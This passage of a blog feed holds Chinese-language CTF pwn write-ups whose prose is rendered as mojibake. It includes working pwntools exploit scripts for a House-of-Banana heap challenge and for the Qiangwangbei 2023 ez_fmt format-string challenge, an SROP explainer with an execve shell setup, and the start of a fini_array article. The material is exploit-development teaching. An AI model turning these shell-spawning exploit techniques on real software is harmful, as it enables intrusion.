io.sendlineafter(<span class="hljs-string">&quot;Size:\n&quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  io.sendafter(<span class="hljs-string">&quot;context: \n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>() :<br>  add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>  add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>  add(<span class="hljs-number">2</span>,<span class="hljs-number">0x418</span>)<br>  free(<span class="hljs-number">0</span>)<br>  add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>  show(<span class="hljs-number">0</span>)<br>  io.recvuntil(<span class="hljs-string">&#x27;context: \n&#x27;</span>)<br>  libc_base=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ec090</span><br><br>  edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>  show(<span class="hljs-number">0</span>)<br>  io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>  heap_base=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x250</span><br> <br>  rtld_global=libc_base+<span class="hljs-number">0x62a060</span><br>  link_map3=libc_base + <span class="hljs-number">0x168fb8</span> <span class="hljs-comment">##éœ€è¦çˆ†ç ´</span><br>  one_gadget=libc_base + <span class="hljs-number">0x4f302</span><br><br><br>  free(<span class="hljs-number">2</span>)<br>  edit(<span class="hljs-number">0</span>,p64(libc_base+<span class="hljs-number">0x3ec090</span>)*<span class="hljs-number">2</span>+p64(heap_base+<span class="hljs-number">0x250</span>)+p64(link_map3-<span class="hljs-number">0x20</span>))<br>  add(<span class="hljs-number">4</span>,<span class="hljs-number">0x500</span>)<br><br>  fake_addr=heap_base+<span class="hljs-number">0xb90</span><br>  payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(fake_addr)<br>  payload = payload.ljust(<span class="hljs-number">0x48</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x58</span>)+p64(<span class="hljs-number">8</span>)+p64(one_gadget)<br>  payload = payload.ljust(<span class="hljs-number">0x110</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x40</span>)<br>  payload = payload.ljust(<span class="hljs-number">0x120</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x48</span>)<br>  payload = payload.ljust(<span class="hljs-number">0x314</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x1c</span>)<br><br>  edit(<span class="hljs-number">2</span>,payload)<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>  io.interactive()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>  io = process(filename)<br>  <span class="hljs-keyword">try</span> :<br>    pwn()<br>    <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">except</span> :<br>    <span class="hljs-keyword">continue</span><br>  <span class="hljs-keyword">finally</span> :<br>    io.close()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Banana</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯2023_ezfmtå¤ç°</title>
    <link href="/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="2023å¼ºç½‘æ¯ez-fmt"><a href="#2023å¼ºç½‘æ¯ez-fmt" class="headerlink" title="2023å¼ºç½‘æ¯ez_fmt"></a><strong>2023å¼ºç½‘æ¯ez_fmt</strong></h2><p>åºè¨€ï¼šæ˜å¤©è¦æ‰“å¼ºç½‘æ¯äº†ï¼Œç‰¹æ„æ‰¾äº†ä¸€ç‚¹ä»¥å‰çš„é¢˜å†™å†™ï¼Œå‘ç°è¿™é«˜è´¨é‡æ¯”èµ›çš„é¢˜çœŸæ˜¯å¼€é˜”è§†é‡äº†ï¼Œæ”¶è·ä¸å°‘ã€‚</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>IDAåç¼–è¯‘ä¸€ä¸‹çœ‹ä¸€ä¸‹ä¼ªä»£ç ï¼Œç¬¬ä¸€çœ¼çœ‹ä¸Šå»çœŸæ˜¯ç®€å•é¢˜å‘€ï¼Œä½†æ˜¯ä»¥å¼€å§‹å†™è„šæœ¬å‘ç°ååˆ†çš„ä¸å¯¹åŠ²ï¼Œåªæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€Œä¸”åˆ©ç”¨è¿‡åä¸èƒ½é€šè¿‡fini_arrayå®ç°æ— é™åˆ©ç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012029275.png" alt="image-20241101202921204"></p><p>æ€è€ƒå¾ˆä¹…éƒ½æ²¡æœ‰æ€è·¯ï¼Œä¸Šç½‘æŸ¥çœ‹äº†å¤§ä½¬çš„wpæ‰æç„¶å¤§æ‚Ÿã€‚ä¹Ÿå½»åº•é¢ è¦†äº†æˆ‘å¯¹æ§åˆ¶å‡½æ•°è¿”å›åœ°å€çš„ç†è§£ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012036093.png" alt="image-20241101203607009"></p><p>é¢˜ç›®é¦–å…ˆç»™äº†ä¸ªbufçš„åœ°å€ï¼Œé€šè¿‡è°ƒè¯•å‘ç°ï¼Œprintfçš„è¿”å›åœ°å€å°±æ˜¯buf-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012038797.png" alt="image-20241101203800712"></p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ§åˆ¶buf-0x8çš„å†…å®¹ï¼Œå®ç°printfå‡½æ•°åç›´æ¥è·³è½¬åˆ°readå‡½æ•°ï¼Œè€Œä¸æ˜¯æ‰§è¡Œw &#x3D; 0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®ç°å¤šæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012041634.png" alt="image-20241101204124552"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æŠŠè¿”å›åœ°å€æ”¹ä¸º0x401205ï¼Œè¿™æ ·å°±ä¼šæ‰§è¡Œå®Œprintfå‡½æ•°ç›´æ¥åˆæ‰§è¡Œreadå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012042572.png" alt="image-20241101204259525"></p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ”»å‡»æ€è·¯ä¸º</p><ol><li>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹printfå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå¹¶ä¸”æ³„éœ²libcåŸºåœ°å€</li><li>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹mainå‡½æ•°çš„è¿”å›åœ°å€ä¸ºone_gadget</li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é¢˜ç›®èƒ½æ³„éœ²åœ°å€ä¸è¦æ€»æƒ³ç€é€šè¿‡mainå‡½æ•°æ§åˆ¶æ‰§è¡Œæµï¼Œæœ‰æ—¶å€™é€šè¿‡å…¶ä»–å‡½æ•°æ‰èƒ½åŒ–ç¹ä¸ºç®€ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./ez_fmt&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * 0x000000000040121B</span><br><span class="hljs-string">    b * 0x0000000000401239</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;gift for you &#x27;</span>)<br>buf_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span> , drop = <span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;buf_addr&#x27;</span>)<br>read_ret = buf_addr - <span class="hljs-number">0x8</span><br>payload = <span class="hljs-string">b&#x27;%5c%9$hhn%17$p%19$p&#x27;</span>.ljust(<span class="hljs-number">0x18</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload += p64(read_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br>p.recv(<span class="hljs-number">5</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;canary&#x27;</span>)<br>__libc_start_call_main = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>) , <span class="hljs-number">16</span>) - <span class="hljs-number">243</span><br>lss(<span class="hljs-string">&#x27;__libc_start_call_main&#x27;</span>)<br>base_addr = __libc_start_call_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;base_addr&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0xe3afe</span> , <span class="hljs-number">0xe3b01</span> , <span class="hljs-number">0xe3b04</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">1</span>]<br>mian_ret = buf_addr + <span class="hljs-number">0x68</span><br>lss(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>bit1 = (execve &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>bit2 = execve &amp; <span class="hljs-number">0xffff</span><br>lss(<span class="hljs-string">&#x27;bit1&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;bit2&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit1).encode() + <span class="hljs-string">b&#x27;c%10$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit2 - bit1).encode() + <span class="hljs-string">b&#x27;c%11$hn&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload = payload.ljust(<span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(mian_ret + <span class="hljs-number">2</span>) + p64(mian_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¼ºç½‘æ¯2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é«˜çº§ROPä¹‹SROP</title>
    <link href="/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/"/>
    <url>/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/</url>
    
    <content type="html"><![CDATA[<h2 id="signalæœºåˆ¶"><a href="#signalæœºåˆ¶" class="headerlink" title="signalæœºåˆ¶"></a>signalæœºåˆ¶</h2><p>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410281958887.png" alt="Process of Signal Handlering"></p><ol><li><p>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</p></li><li><p>è¿›å…¥å†…æ ¸å‰ä¸ºäº†æ¢å¤è¿›ç¨‹éœ€è¦ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œ<strong>ä¸»è¦æ˜¯æŠŠæ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥signalä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘sigreturnçš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚</strong>ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282005729.png" alt="sdf"></p></li><li><p>signal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚</p></li></ol><h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>ä»”ç»†å›é¡¾ä¸€ä¸‹å†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>Signal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚</li><li>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œæ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frameã€‚</li></ul><p>è¯´åˆ°è¿™é‡Œï¼Œå…¶å®ï¼ŒSROP çš„åŸºæœ¬åˆ©ç”¨åŸç†ä¹Ÿå°±å‡ºç°äº†ã€‚</p><h2 id="æ”»å‡»æ‰‹æ³•"><a href="#æ”»å‡»æ‰‹æ³•" class="headerlink" title="æ”»å‡»æ‰‹æ³•"></a>æ”»å‡»æ‰‹æ³•</h2><h3 id="è·å¾—shell"><a href="#è·å¾—shell" class="headerlink" title="è·å¾—shell"></a>è·å¾—shell</h3><p>æˆ‘ä»¬éœ€è¦åœ¨Signal Frameä¸­æ§åˆ¶å¯„å­˜å™¨ä¿¡æ¯ï¼Œå½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rax</span> <span class="hljs-number">59</span><br><span class="hljs-built_in">rdi</span> = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rdx</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rip</span> = <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯</p><ul><li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆã€‚</strong></li><li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„<code>syscall</code> gadget æ¢æˆ<code>syscall; ret</code> gadgetã€‚</strong></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282039291.png" alt="signal2-stack"></p>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºfini_arrayçš„å·§å¦™åˆ©ç”¨</title>
    <link href="/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"/>
    <url>/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ä»¶å¯åŠ¨ä¹‹ELF"><a href="#æ–‡ä»¶å¯åŠ¨ä¹‹ELF" class="headerlink" title="æ–‡ä»¶å¯åŠ¨ä¹‹ELF"></a>æ–‡ä»¶å¯åŠ¨ä¹‹ELF</h2><p>ç»å¸¸è°ƒè¯•çš„æœ‹å‹éƒ½çŸ¥é“ï¼Œmainå‡½æ•°å…¶å®ä¸æ˜¯ç¨‹åºçš„èµ·ç‚¹ã€‚ç¨‹åºçš„å¯åŠ¨æµç¨‹ä¾æ¬¡ä¸º</p><p><code>_start --&gt; __libc_start_main --&gt; main</code></p><h2 id="libc-start-mainåˆ†æ"><a href="#libc-start-mainåˆ†æ" class="headerlink" title="__libc_start_mainåˆ†æ"></a>__libc_start_mainåˆ†æ</h2><p>å¯¹åº”<code>_start</code>çš„ä»£ç ï¼Œå¯ä»¥å‘ç°<code>__libc_start_main</code>å‡½æ•°çš„å‚æ•°ä¸­ï¼Œæœ‰3ä¸ªæ˜¯å‡½æ•°æŒ‡é’ˆï¼š</p><ul><li><code>rdi</code> &lt;- <code>main</code></li><li><code>rcx</code> &lt;- <code>__libc_csu_init</code></li><li><code>r8</code> &lt;- <code>__libc_csu_fini</code></li></ul><p>ä¸éš¾æƒ³åˆ°ï¼Œé™¤<code>main</code>ä»¥å¤–çš„è¿™ä¸¤ä½å…„å¼Ÿï¼Œä¸€ä½åœ¨<code>main</code>å¼€å§‹æ‰§è¡Œå‰æ‰§è¡Œï¼Œä¸€ä½åœ¨<code>main</code>æ‰§è¡Œå®Œæ¯•åæ‰§è¡Œ</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/20i <span class="hljs-number">0x402bd0</span><br>   <span class="hljs-number">0x402bd0</span> &lt;__libc_csu_fini&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402bd1</span> &lt;__libc_csu_fini+<span class="hljs-number">1</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xb24e8</span>]        # <span class="hljs-number">0x4b50c0</span> <br>   <span class="hljs-number">0x402bd8</span> &lt;__libc_csu_fini+<span class="hljs-number">8</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rbp</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xb24d1</span>]        # <span class="hljs-number">0x4b50b0</span> <br>   <span class="hljs-number">0x402bdf</span> &lt;__libc_csu_fini+<span class="hljs-number">15</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0x402be0</span> &lt;__libc_csu_fini+<span class="hljs-number">16</span>&gt;:<span class="hljs-keyword">sub</span>    <span 